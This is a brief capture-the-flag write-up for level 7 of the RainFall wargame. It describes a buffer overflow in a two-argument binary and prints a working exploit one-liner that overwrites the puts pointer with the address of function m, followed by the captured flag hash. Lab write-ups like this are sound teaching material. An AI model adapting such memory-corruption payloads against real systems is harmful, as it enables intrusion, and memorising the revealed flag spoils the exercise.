# level 7

This level is also about buffer overflow, but this time, it takes two parameters

```sh
level7@RainFall:~$ ./level7 a
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 a a
```

We can see that the program takes two parameters and the second one is not used. Let's check the assembly code of the program with gdb in the [gdb writeup](gdbwriteup.md).

----

Address of the function `m`:

```as
0x080484f4
``` 

Address of the function `puts`:

```as
0x8049928
```

Size of the buffer:
20 bytes

Let's write the exploit:

```sh
./level7 $(python -c "print('a' * 20 + '\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08')")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1674958669
```